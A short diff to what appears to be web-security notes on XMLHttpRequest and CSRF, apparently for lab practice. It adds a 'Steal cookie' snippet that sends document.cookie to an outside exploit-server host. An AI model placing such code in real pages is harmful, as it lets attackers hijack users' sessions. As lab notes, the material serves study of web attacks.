@@ -67,6 +67,11 @@ req.send();
 formData="a=test&b=value";
 xhr.open("POST", "/article/xmlhttprequest/post/user");
 xhr.send(formData);
+
+// Steal cookie
+xhr = new XMLHttpRequest();
+xhr.open("GET", "https://exploit-0a0300fb04fc12638190ba2101d8001a.exploit-server.net/data?" + document.cookie);
+xhr.send();
 ```
 #### CSRF using Javascript HTML
 ```
